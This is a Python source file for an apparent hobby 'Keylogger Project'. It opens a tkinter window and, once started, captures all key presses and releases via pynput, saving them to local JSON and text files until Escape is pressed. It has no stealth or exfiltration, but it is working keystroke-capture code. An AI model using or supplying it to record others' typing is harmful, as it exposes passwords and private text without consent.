import tkinter as tk
from pynput import keyboard
import json
import os
import sys
root = tk.Tk()
root.geometry("500x500")
root.title("Keylogger Project")
root.config(bg="lightgreen")


key_list = []

# Get the absolute path of the script directory
script_dir = os.path.dirname(os.path.abspath(__file__))
logs_file_path = os.path.join(script_dir, 'logs.json')
txt_file_path = os.path.join(script_dir, 'log.txt')

def update_txt_file(key):
    with open(txt_file_path, 'a+') as key_strokes:
        key_strokes.write(key)

def update_json_file(key_list):
    with open(logs_file_path, 'w+') as key_strokes:
        json.dump(key_list, key_strokes)

def on_release(key):
    global x, key_list
    key_list.append({'Released': str(key)})
    update_txt_file(str(key))
    update_json_file(key_list)

def on_press(key):
    global x, key_list

    
    if not x:
        key_list.append({'Pressed': str(key)})
        x = True
    if x:
        key_list.append({'Head': str(key)})
    update_json_file(key_list)

    if key == keyboard.Key.esc:  # Check if the Escape key is pressed
        stop_keylogger()

def butaction():
    global x
    x = False
    print("[+] Running the Keylogger successfully!\nSaving the key logs in 'logs.json'")
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

def stop_keylogger():
    print("Keylogger is stopped")
    root.quit()
    sys.exit(0)
    

empty = tk.Label(root, text=" ")
empty.grid(row=1, column=0)

empty = tk.Label(root, text="Keylogger Project", font="Verdana 11 bold")
empty.grid(row=3, column=2)

empty = tk.Label(root, text=" ")
empty.grid(row=5, column=0)

tk.Button(root, text="Start Keylogger", command=butaction).grid(row=6, column=0)


root.mainloop()
